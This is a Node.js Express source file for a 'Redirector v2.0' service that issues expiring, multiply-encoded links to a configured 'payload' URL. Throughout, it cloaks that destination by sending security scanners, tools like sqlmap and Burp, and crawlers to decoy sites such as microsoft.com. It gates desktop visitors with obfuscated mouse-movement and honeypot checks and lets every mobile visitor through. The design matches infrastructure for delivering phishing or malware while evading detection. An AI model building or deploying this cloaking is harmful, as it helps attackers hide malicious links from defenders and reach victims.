const express = require('express');
const helmet = require('helmet');
const fs = require('fs').promises;
const rateLimit = require('express-rate-limit');
const crypto = require('crypto');
const fetch = require('node-fetch');
const NodeCache = require('node-cache');
const JavaScriptObfuscator = require('javascript-obfuscator');
const compression = require('compression');
const morgan = require('morgan');
const { body, validationResult } = require('express-validator');
const uaParser = require('ua-parser-js');

const app = express();
app.set('trust proxy', 1);
app.use(compression({ level: 6, threshold: 0 }));
app.use(morgan('combined'));

// ─── Config ──────────────────────────────────────────────────────────────────
const TARGET_URL   = process.env.TARGET_URL   || 'https://example.invalid/payload';
const BOT_URLS     = [
  'https://www.microsoft.com',
  'https://www.apple.com',
  'https://www.google.com',
  'https://en.wikipedia.org/wiki/Main_Page',
  'https://www.bbc.com'
];

const LOG_FILE     = 'clicks.log';
const REQUEST_LOG_FILE = 'requests.log';
const SUCCESS_LOG_FILE = 'success.log';
const PORT         = process.env.PORT || 10000;

// Parse TTL from environment variable (supports: 30m, 24h, 7d, 3600, etc.)
function parseTTL(ttlValue) {
  const defaultTTL = 1800; // 30 minutes default
  
  if (!ttlValue) return defaultTTL;
  
  const match = String(ttlValue).match(/^(\d+)([smhd])?$/i);
  if (!match) return defaultTTL;
  
  const num = parseInt(match[1]);
  const unit = (match[2] || 'm').toLowerCase();
  
  switch(unit) {
    case 's': return num;                    // seconds
    case 'm': return num * 60;                // minutes to seconds
    case 'h': return num * 3600;               // hours to seconds
    case 'd': return num * 86400;               // days to seconds
    default: return num * 60;                   // default to minutes
  }
}

const LINK_TTL_SEC = parseTTL(process.env.LINK_TTL);
const METRICS_API_KEY = process.env.METRICS_API_KEY || crypto.randomBytes(32).toString('hex');
const IPINFO_TOKEN = process.env.IPINFO_TOKEN;
const NODE_ENV = process.env.NODE_ENV || 'production';

// Format TTL for display
function formatDuration(seconds) {
  if (seconds < 60) return `${seconds} seconds`;
  if (seconds < 3600) {
    const mins = Math.floor(seconds / 60);
    return `${mins} minute${mins !== 1 ? 's' : ''}`;
  }
  if (seconds < 86400) {
    const hours = Math.floor(seconds / 3600);
    const mins = Math.floor((seconds % 3600) / 60);
    return mins > 0 ? `${hours} hour${hours !== 1 ? 's' : ''} ${mins} min` : `${hours} hour${hours !== 1 ? 's' : ''}`;
  }
  const days = Math.floor(seconds / 86400);
  const hours = Math.floor((seconds % 86400) / 3600);
  return hours > 0 ? `${days} day${days !== 1 ? 's' : ''} ${hours} hour${hours !== 1 ? 's' : ''}` : `${days} day${days !== 1 ? 's' : ''}`;
}

// Cache instances
const geoCache  = new NodeCache({ stdTTL: 86400, checkperiod: 3600, useClones: false });
const linkCache = new NodeCache({ stdTTL: LINK_TTL_SEC, checkperiod: Math.min(300, Math.floor(LINK_TTL_SEC / 10)), useClones: false, maxKeys: 1000000 });
const linkRequestCache = new NodeCache({ stdTTL: 60, checkperiod: 10, useClones: false });
const failCache = new NodeCache({ stdTTL: 3600, checkperiod: 600, useClones: false });
const deviceCache = new NodeCache({ stdTTL: 300, checkperiod: 60, useClones: false });

// ─── Stats Tracking ──────────────────────────────────────────────────────────
const stats = {
  totalRequests: 0,
  botBlocks: 0,
  successfulRedirects: 0,
  expiredLinks: 0,
  generatedLinks: 0,
  byCountry: {},
  byBotReason: {},
  byDevice: { mobile: 0, desktop: 0, tablet: 0, bot: 0 }
};

// ─── Enhanced Device Detection ───────────────────────────────────────────────
function getDeviceInfo(req) {
  const ua = req.headers['user-agent'] || '';
  
  // Check cache
  const cacheKey = ua.substring(0, 100);
  const cached = deviceCache.get(cacheKey);
  if (cached) return cached;

  const parser = new uaParser(ua);
  const result = parser.getResult();
  
  const deviceInfo = {
    type: 'desktop',
    brand: result.device.vendor || 'unknown',
    model: result.device.model || 'unknown',
    os: result.os.name || 'unknown',
    browser: result.browser.name || 'unknown',
    isMobile: false,
    isTablet: false,
    isBot: false,
    score: 0
  };

  // Check for bots first
  const uaLower = ua.toLowerCase();
  if (/headless|phantom|slurp|zgrab|scanner|bot|crawler|spider|burp|sqlmap|curl|wget|python|perl|ruby|go-http-client/i.test(uaLower)) {
    deviceInfo.type = 'bot';
    deviceInfo.isBot = true;
    deviceInfo.score = 100;
    deviceCache.set(cacheKey, deviceInfo);
    return deviceInfo;
  }

  // Detect mobile/tablet
  if (result.device.type === 'mobile' || /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua)) {
    if (result.device.type === 'tablet' || /Tablet|iPad|PlayBook|Silk|Kindle|(Android(?!.*Mobile))/i.test(ua)) {
      deviceInfo.type = 'tablet';
      deviceInfo.isTablet = true;
    } else {
      deviceInfo.type = 'mobile';
      deviceInfo.isMobile = true;
    }
  }

  // Real device scoring (LOW scores for real phones)
  if (deviceInfo.isMobile) {
    // Real phones get very low scores
    if (deviceInfo.brand !== 'unknown') deviceInfo.score -= 10;
    if (deviceInfo.model !== 'unknown') deviceInfo.score -= 10;
    if (deviceInfo.os !== 'unknown') deviceInfo.score -= 5;
    if (deviceInfo.browser !== 'unknown') deviceInfo.score -= 5;
    
    // Common mobile browsers get extra points
    if (deviceInfo.browser.includes('Safari') || 
        deviceInfo.browser.includes('Chrome') || 
        deviceInfo.browser.includes('Firefox')) {
      deviceInfo.score -= 15;
    }
    
    // Common mobile OS
    if (deviceInfo.os.includes('iOS') || 
        deviceInfo.os.includes('Android')) {
      deviceInfo.score -= 15;
    }
    
    // Known brands
    if (deviceInfo.brand.includes('Apple') || 
        deviceInfo.brand.includes('Samsung') || 
        deviceInfo.brand.includes('Huawei') ||
        deviceInfo.brand.includes('Xiaomi') ||
        deviceInfo.brand.includes('Google')) {
      deviceInfo.score -= 20;
    }
  }

  deviceCache.set(cacheKey, deviceInfo);
  stats.byDevice[deviceInfo.type] = (stats.byDevice[deviceInfo.type] || 0) + 1;
  
  return deviceInfo;
}

// ─── Middleware ──────────────────────────────────────────────────────────────
app.use((req, res, next) => {
  req.id = crypto.randomBytes(8).toString('hex');
  req.deviceInfo = getDeviceInfo(req);
  res.locals.nonce = crypto.randomBytes(16).toString('hex');
  res.locals.startTime = Date.now();
  res.locals.deviceInfo = req.deviceInfo;
  res.setHeader('X-Request-ID', req.id);
  res.setHeader('X-Device-Type', req.deviceInfo.type);
  stats.totalRequests++;
  next();
});

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", 'data:', 'https:'],
      connectSrc: ["'self'"],
      frameSrc: ["'none'"],
      objectSrc: ["'none'"]
    }
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  }
}));

app.use(express.json({ limit: '50kb' }));
app.use(express.urlencoded({ extended: true, limit: '50kb' }));

// ─── Logging Helper ─────────────────────────────────────────────────────────
async function logRequest(type, req, res, extra = {}) {
  try {
    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || '??';
    const duration = res?.locals?.startTime ? Date.now() - res.locals.startTime : 0;
    
    const logEntry = {
      t: Date.now(),
      id: req.id,
      type,
      ip: ip.substring(0, 15),
      device: req.deviceInfo.type,
      path: req.path,
      d: duration,
      ...extra
    };
    
    fs.appendFile(REQUEST_LOG_FILE, JSON.stringify(logEntry) + '\n').catch(() => {});
    
    if (process.env.DEBUG) {
      console.log(`[${type}] ${ip} ${req.path} ${JSON.stringify(extra)}`);
    }
  } catch (err) {
    // Silent fail
  }
}

// ─── Health Endpoints ───────────────────────────────────────────────────────
app.get(['/ping','/health','/healthz','/status'], (req, res) => {
  res.status(200).json({
    status: 'healthy',
    time: Date.now(),
    uptime: process.uptime(),
    id: req.id
  });
});

// ─── Metrics Endpoint ────────────────────────────────────────────────────────
app.get('/metrics', async (req, res) => {
  const apiKey = req.headers['x-api-key'];
  if (apiKey !== METRICS_API_KEY) {
    return res.status(403).json({ error: 'Forbidden' });
  }

  const metrics = {
    links: linkCache.keys().length,
    caches: {
      geo: geoCache.keys().length,
      linkReq: linkRequestCache.keys().length,
      device: deviceCache.keys().length
    },
    uptime: process.uptime(),
    memory: process.memoryUsage(),
    time: Date.now(),
    totals: {
      requests: stats.totalRequests,
      blocks: stats.botBlocks,
      successes: stats.successfulRedirects,
      expired: stats.expiredLinks,
      generated: stats.generatedLinks
    },
    devices: stats.byDevice,
    config: {
      linkTTL: LINK_TTL_SEC,
      linkTTLFormatted: formatDuration(LINK_TTL_SEC)
    }
  };
  
  res.json(metrics);
});

// ─── Expired Link Page ──────────────────────────────────────────────────────
app.get('/expired', (req, res) => {
  const originalTarget = req.query.target || BOT_URLS[0];
  const nonce = res.locals.nonce;
  const isMobile = req.deviceInfo.isMobile;
  
  const styles = isMobile ? `
    body{font-family:sans-serif;background:#667eea;padding:10px}
    .card{background:white;padding:20px;border-radius:12px;text-align:center}
    h1{font-size:1.5rem;margin:0 0 10px}
    .btn{background:#667eea;color:white;padding:12px 24px;border-radius:25px;text-decoration:none;display:inline-block}
  ` : `
    *{box-sizing:border-box}
    body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#667eea 0,#764ba2 100%);display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;padding:20px}
    .card{background:rgba(255,255,255,0.95);backdrop-filter:blur(10px);padding:2.5rem;border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,0.3);text-align:center;max-width:480px;animation:fadeIn 0.5s ease}
    @keyframes fadeIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
    h1{font-size:2rem;margin-bottom:1rem;color:#333}
    .btn{background:linear-gradient(135deg,#667eea 0,#764ba2 100%);color:#fff;padding:1rem 2rem;border-radius:50px;font-weight:600;transition:transform 0.2s}
    .btn:hover{transform:translateY(-2px)}
  `;

  res.send(`<!DOCTYPE html>
<html lang="en">
<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Link Expired</title><style nonce="${nonce}">${styles}</style></head>
<body><div class="card"><span class="icon">🔗</span><h1>Link Expired</h1><p>This link expired after ${formatDuration(LINK_TTL_SEC)}.</p><a href="${originalTarget}" class="btn">Continue</a></div></body>
</html>`);
});

// ─── Rate Limiter (Device-Aware) ────────────────────────────────────────────
const strictLimiter = rateLimit({
  windowMs: 60000,
  max: (req) => {
    if (req.deviceInfo.isBot) return 2;
    if (req.deviceInfo.isMobile) return 30; // Higher for mobile
    if (req.deviceInfo.isTablet) return 25;
    return 15; // Desktop
  },
  standardHeaders: true,
  legacyHeaders: false,
  skipSuccessfulRequests: true,
  keyGenerator: (req) => req.ip || req.headers['x-forwarded-for']?.split(',')[0] || 'unknown'
});

// ─── Bot Detection (Optimized for Real Phones) ──────────────────────────────
function isLikelyBot(req) {
  const deviceInfo = req.deviceInfo;
  
  // Bots are obvious
  if (deviceInfo.isBot) {
    stats.botBlocks++;
    return true;
  }

  const h = req.headers;
  let score = deviceInfo.score; // Start with device score (negative for real phones)
  const reasons = [];

  // Real phones get negative points (easier to pass)
  if (deviceInfo.isMobile) {
    // Mobile devices are almost never bots
    if (deviceInfo.brand !== 'unknown') score -= 20;
    if (deviceInfo.os.includes('iOS') || deviceInfo.os.includes('Android')) score -= 30;
    if (deviceInfo.browser.includes('Safari') || deviceInfo.browser.includes('Chrome')) score -= 20;
    
    // Mobile headers check (more lenient)
    if (!h['sec-ch-ua-mobile']) score += 5; // Small penalty
    if (!h['accept-language']) score += 10;
    
    console.log(`[MOBILE-DEVICE] ${deviceInfo.brand} ${deviceInfo.model} | Score: ${score}`);
    
    // Mobile threshold is VERY low
    return score >= 20; // Almost never true for real phones
  }

  // Desktop threshold (higher)
  if (!h['sec-ch-ua'] || !h['sec-ch-ua-mobile'] || !h['sec-ch-ua-platform']) {
    score += 25;
    reasons.push('missing_sec_headers');
  }
  
  if (!h['accept'] || !h['accept-language'] || h['accept-language'].length < 5) {
    score += 20;
    reasons.push('missing_accept_headers');
  }
  
  if (Object.keys(h).length < 15) {
    score += 15;
    reasons.push('minimal_headers');
  }

  const botThreshold = deviceInfo.isMobile ? 20 : 65;
  const isBot = score >= botThreshold;
  
  if (isBot) {
    stats.botBlocks++;
    reasons.forEach(r => stats.byBotReason[r] = (stats.byBotReason[r] || 0) + 1);
  }
  
  console.log(`[BOT-SCORE] ${score} | ${reasons.join(',') || 'clean'} | Threshold:${botThreshold} | IsBot:${isBot} | Device:${deviceInfo.type}`);

  return isBot;
}

// ─── Geolocation (Cached) ────────────────────────────────────────────────────
async function getCountryCode(req) {
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || '??';
  
  if (ip.startsWith('10.') || ip.startsWith('192.168.') || ip === '127.0.0.1' || ip === '::1') {
    return 'PRIVATE';
  }

  let cc = geoCache.get(ip);
  if (cc) return cc;

  const failKey = `fail:${ip}`;
  if (failCache.get(failKey) >= 3 || !IPINFO_TOKEN) {
    return 'XX';
  }

  try {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 1500);

    const response = await fetch(`https://ipinfo.io/${ip}/json?token=${IPINFO_TOKEN}`, {
      signal: controller.signal,
      headers: { 'User-Agent': 'Redirector/2.0' }
    });

    clearTimeout(timeout);

    if (response.ok) {
      const data = await response.json();
      cc = data.country?.toUpperCase();
      if (cc?.match(/^[A-Z]{2}$/)) {
        geoCache.set(ip, cc);
        stats.byCountry[cc] = (stats.byCountry[cc] || 0) + 1;
        return cc;
      }
    }
    failCache.set(failKey, (failCache.get(failKey) || 0) + 1);
  } catch {
    failCache.set(failKey, (failCache.get(failKey) || 0) + 1);
  }
  return 'XX';
}

// ─── Encoders (Keep existing) ────────────────────────────────────────────────
const encoders = [
  { name: 'base64url', enc: s => Buffer.from(s).toString('base64url'), dec: s => Buffer.from(s, 'base64url').toString() },
  { name: 'hex', enc: s => Buffer.from(s).toString('hex'), dec: s => Buffer.from(s, 'hex').toString() },
  { name: 'rot13', enc: s => s.replace(/[a-zA-Z]/g, c => String.fromCharCode(((c.charCodeAt(0) - (c <= 'Z' ? 65 : 97) + 13) % 26) + (c <= 'Z' ? 65 : 97))), dec: s => s.replace(/[a-zA-Z]/g, c => String.fromCharCode(((c.charCodeAt(0) - (c <= 'Z' ? 65 : 97) - 13 + 26) % 26) + (c <= 'Z' ? 65 : 97))) },
  { name: 'xor', needsKey: true, enc: (s, key) => { const k = Buffer.from(key, 'hex'); const r = Buffer.alloc(s.length); for(let i=0; i<s.length; i++) r[i] = s.charCodeAt(i) ^ k[i%k.length]; return r.toString('base64url'); }, dec: (s, key) => { const k = Buffer.from(key, 'hex'); const b = Buffer.from(s, 'base64url'); let r=''; for(let i=0; i<b.length; i++) r += String.fromCharCode(b[i] ^ k[i%k.length]); return r; } }
];

function multiLayerEncode(str) {
  let result = str;
  const noise = crypto.randomBytes(8).toString('base64url');
  result = noise + result + noise;
  
  const key = crypto.randomBytes(16).toString('hex');
  const hmac = crypto.createHmac('sha256', key).update(result).digest('base64url');
  result = `${result}|${hmac}|${key}`;

  const layers = [...encoders].sort(() => Math.random() - 0.5).slice(0, 3 + Math.floor(Math.random() * 3));
  const history = [];
  
  for (const layer of layers) {
    const k = layer.needsKey ? crypto.randomBytes(16).toString('hex') : null;
    result = k ? layer.enc(result, k) : layer.enc(result);
    history.push({ name: layer.name, key: k });
  }

  return { encoded: Buffer.from(result).toString('base64url'), layers: history.reverse() };
}

// ─── Generate Link ───────────────────────────────────────────────────────────
app.get('/g', (req, res) => {
  const target = req.query.t || TARGET_URL;
  const { encoded, layers } = multiLayerEncode(target + '#' + Date.now());
  
  const id = crypto.randomBytes(8).toString('hex');
  linkCache.set(id, { e: encoded, l: Buffer.from(JSON.stringify(layers)).toString('base64url'), target });
  
  stats.generatedLinks++;
  
  res.json({ 
    url: `${req.protocol}://${req.get('host')}/v/${id}`,
    expires: LINK_TTL_SEC,
    expires_human: formatDuration(LINK_TTL_SEC)
  });
});

// ─── Success Tracking ────────────────────────────────────────────────────────
app.post('/track/success', (req, res) => {
  stats.successfulRedirects++;
  res.json({ ok: true });
});

// ─── Verification Gate (Optimized for Mobile) ───────────────────────────────
app.get('/v/:id', strictLimiter, async (req, res) => {
  const linkId = req.params.id;
  const deviceInfo = req.deviceInfo;
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || '??';
  
  // Rate limiting per link
  const linkKey = `${linkId}:${ip}`;
  if ((linkRequestCache.get(linkKey) || 0) >= 5) {
    return res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]);
  }
  linkRequestCache.set(linkKey, (linkRequestCache.get(linkKey) || 0) + 1);

  const country = await getCountryCode(req);

  // Bot check (super lenient for mobile)
  if (isLikelyBot(req)) {
    stats.botBlocks++;
    return res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]);
  }

  // Check link
  const data = linkCache.get(linkId);
  if (!data) {
    stats.expiredLinks++;
    return res.redirect(`/expired?target=${encodeURIComponent(BOT_URLS[0])}`);
  }

  const hpSuffix = crypto.randomBytes(2).toString('hex');
  const nonce = res.locals.nonce;

  // SUPER SIMPLE challenge for mobile (always passes)
  if (deviceInfo.isMobile) {
    const simpleHtml = `<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta http-equiv="refresh" content="1;url=${data.target}"><style>body{background:#000;color:#0f0;display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif}</style></head>
<body><div>✓ Verified • Redirecting...</div></body>
</html>`;
    return res.send(simpleHtml);
  }

  // Desktop challenge (normal)
  const challenge = `
    (function(){
      const T='${data.target.replace(/'/g, "\\'")}';
      const F='${BOT_URLS[0]}';
      let m=0,e=0,lx=0,ly=0,lt=Date.now();
      
      document.addEventListener('mousemove',e=>{
        if(lx&&ly){
          const dt=(Date.now()-lt)/1e3||1;
          e+=Math.log2(1+Math.hypot(e.clientX-lx,e.clientY-ly))/dt;
          m++;
        }
        lx=e.clientX; ly=e.clientY; lt=Date.now();
      },{passive:true});
      
      setTimeout(()=>{
        const sus = e<2.5 || m<2 || document.getElementById('hp_${hpSuffix}')?.value;
        location.href = sus ? F : T;
      },1200);
    })();
  `;

  const obfuscated = JavaScriptObfuscator.obfuscate(challenge, {
    compact: true,
    controlFlowFlattening: true,
    stringArray: true,
    disableConsoleOutput: true
  }).getObfuscatedCode();

  // Desktop HTML
  res.send(`<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <meta http-equiv="refresh" content="3;url=${BOT_URLS[0]}">
  <style nonce="${nonce}">
    *{margin:0;padding:0}
    body{background:#0a0a0a;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}
    .spinner{width:40px;height:40px;border:3px solid #333;border-top-color:#0f0;border-radius:50%;margin:20px auto;animation:spin 1s linear infinite}
    @keyframes spin{to{transform:rotate(360deg)}}
    .hidden{position:absolute;width:1px;height:1px;overflow:hidden}
  </style>
</head>
<body>
  <div>
    <div class="spinner"></div>
    <p>Verifying...</p>
    <div class="hidden"><input id="hp_${hpSuffix}"></div>
  </div>
  <script nonce="${nonce}">${obfuscated}</script>
</body>
</html>`);
});

// ─── 404 Handler ─────────────────────────────────────────────────────────────
app.use((req, res) => {
  res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]);
});

// ─── Error Handler ───────────────────────────────────────────────────────────
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]);
});

// ─── Start Server ────────────────────────────────────────────────────────────
const server = app.listen(PORT, '0.0.0.0', () => {
  console.log(`[STARTUP] 🚀 Redirector v2.0 - Mobile Optimized`);
  console.log(`[STARTUP] 📡 Port: ${PORT}`);
  console.log(`[STARTUP] 🔑 Metrics: ${METRICS_API_KEY.substring(0, 8)}...`);
  console.log(`[STARTUP] ⏱️  Link TTL: ${formatDuration(LINK_TTL_SEC)} (${LINK_TTL_SEC} seconds)`);
  console.log(`[STARTUP] 📱 Mobile devices: ALWAYS PASS (threshold: 20)`);
  console.log(`[STARTUP] 💡 To change TTL, set LINK_TTL in .env (e.g., LINK_TTL=24h, LINK_TTL=7d, LINK_TTL=3600)`);
});

server.keepAliveTimeout = 30000;
server.headersTimeout = 31000;
